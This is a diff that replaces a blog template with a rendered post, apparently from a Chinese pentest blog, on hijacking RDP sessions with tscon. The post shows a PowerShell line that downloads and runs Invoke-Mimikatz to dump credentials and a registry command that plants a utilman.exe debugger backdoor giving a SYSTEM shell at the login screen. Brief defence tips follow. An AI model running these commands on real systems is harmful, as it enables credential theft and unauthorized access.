@@ -1,39 +1,184 @@
-extends includes/layout
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>c1y2m3’blog</title>
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
+    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+</head>
+<body>
+<header class="header">
+    <div class="header-inner">
+        <div class="header-title">
 
-block content
+        </div>
+        <nav class="header-nav">
+            
+            <a href="/c1y2m3.github.io/" class="header-nav-link">
+                首页
+            </a>
+            
 
-    section#wrapper.post
-        article
-            header
-                h1!=page.title
-                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
-                    |·
-                    |#{wordcount(page.content)} words
-                    |·
-                    |#{min2read(page.content)} minutes read
-                    span.tags
+            
+            <a href="/c1y2m3.github.io/archives" class="header-nav-link">
+                归档
+            </a>
+            
 
-            if toc(page.content)
-                div#toc!=toc(page.content,{list_number:false})
+            
+            <a href="/c1y2m3.github.io/tags" class="header-nav-link">
+                标签
+            </a>
+            
 
-            section#post-body!=page.content
+            
+        </nav>
+    </div>
+</header>
+<header class="mobile-header">
+    <div class="mobile-nav">
+        <div class="mobile-nav-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="mobile-nav-title">
+            <a href="/c1y2m3.github.io/" class="mobile-nav-title-link">John Doe's Blog</a>
+        </div>
 
-            - var prev = page.prev ? page.prev.path : false;
-            - var next = page.next ? page.next.path : false;
-            nav#post-nav
-                span.prev
-                    if page.prev
-                        a(href=url_for(prev))
-                            span.arrow ←
-                            | Newer Posts
-                span.next
-                    if page.next
-                        a(href=url_for(next))
-                            | Older Posts
-                            span.arrow →
+    </div>
+    <nav class="mobile-menu">
+        <ul class="mobile-menu-list">
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-home"></i>
+                <a href="/c1y2m3.github.io/" class="mobile-nav-link">首页</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-archive"></i>
+                <a href="/c1y2m3.github.io/archives" class="mobile-nav-link">归档</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-tag"></i>
+                <a href="/c1y2m3.github.io/tags" class="mobile-nav-link">标签</a>
+            </li>
+            <li class="mobile-menu-item">
+                <i class="iconfont icon-about"></i>
+                <a href="/c1y2m3.github.io/about/" class="mobile-nav-link">关于</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<div class="main">
+    <div class="content-inner">
+        <div class="posts">
+    <article class="post-whole">
+        <div class="post-title">
+            <h2 class="title">利用tscon未授权登录远程桌面</h2>
+            <div class="post-meta">
+                <span class="post-time">2019-01-17</span>
+                
+                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
+            </div>
+        </div>
+        <div class="post-toc" id="post-toc">
+    <strong class="post-toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#防御建议："><span class="toc-text">防御建议：</span></a></li></ol>
+    <div class="back-to-top" id="back-to-top">
+        <a href="javascript:void(0);">回到顶部</a>
+    </div>
+</div>
+        <div class="post-content">
+            <p>​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>​<br>参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。</p>
+<p>对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：<br>测试系统： Server 2008 R2<br>用户Administrator为本地登录  </p>
+<p>用户college通过远程桌面服务(RDP)想要切换至用户administraror,可通过右键-Connect进行连接，接着输入密码即可。</p>
+<p>如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb" alt=""></p>
+<p>tscon是命令行下使用的工具，可实现相同的功能。</p>
+<p>首先获取用户对应的sessionid,执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24" alt=""></p>
+<p>用户administrator对应的sessionsid为2 </p>
+<p>通过tscon切换到用户管理员的桌面，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /PASSWORD：XXXXX</span><br></pre></td></tr></table></figure>
+<p>通过三好学生师傅的方法、获取System权限，就能绕过输入密码的过程，直接切换。</p>
+<p>参考 ：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a></p>
+<p>但在默些环境中，常常被系统策略阻断了，常常不得以实现。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt=""></p>
+<p>通常一般拿到webshell后、进行mimikatz一波输出、dump出用户组的ntlm，如果exe被杀软拦截了或组策略限制了， 那依然还是可以使用Powershell进行操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+<p>由于菜刀处于非交换模式，默些情况导致无法运行突破UAC的运行的下，可用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)配合tscon绕过系统登录界面</p>
+<p>调用辅助工具管理器的快捷键: Win+U<br>通过注册表劫持实现后门，修改注册表的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图：</p>
+<p>即可成功从本地用户组跳入域主机内。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5" alt=""></p>
+<p>当然，也是可以通过创建服务的方法进行劫持。</p>
+<p><img src="https://mochazz.github.io/img/pentest1/p14.png" alt=""></p>
+<p><strong>补充：</strong></p>
+<p>在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错</p>
+<p>使用incognito能够成功降权，但是操作受限如下图：</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956" alt=""></p>
+<h2 id="防御建议："><a href="#防御建议：" class="headerlink" title="防御建议："></a>防御建议：</h2><p>建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话</p>
+<p>监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话</p>
+<p>对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录</p>
 
-            include includes/comment.pug
+        </div>
+        
+    </article>
+</div>
+<div class="paginator">
+    
+        
+            <a class="prev" href="/c1y2m3.github.io/2019/01/19/ 浅析Windows本地认证 /">
+                <i class="iconfont icon-prev"></i>
+                <span class="nav-default">浅析Windows本地认证</span>
+                <span class="nav-mobile">上一篇</span>
+            </a>
+        
+        
+            <a class="next" href="/c1y2m3.github.io/2018/11/20/在Linux下文件包含漏洞的另类拿SHELL方法 /">
+                <span class="nav-default">在Linux下文件包含漏洞的另类拿SHELL方法</span>
+                <span class="nav-mobile">下一篇</span>
+                <i class="iconfont icon-next"></i>
+            </a>
+        
+    
+</div>
+<div id="comment-container"></div>
+    </div>
+</div>
+<footer class="footer-social">
+    
 
+    
 
+    
 
+    <div class="footer-copyright">
+        <p class="time-line">
+            &copy;
+            
+            
+            2019
+            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
+            <a target="_blank" href="https://github.com/iJinxin">John Doe</a>
+        </p>
+        <p class="theme-info">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
+            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
+        </p>
+    </div>
+</footer>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    
 
+</script>
+</html>
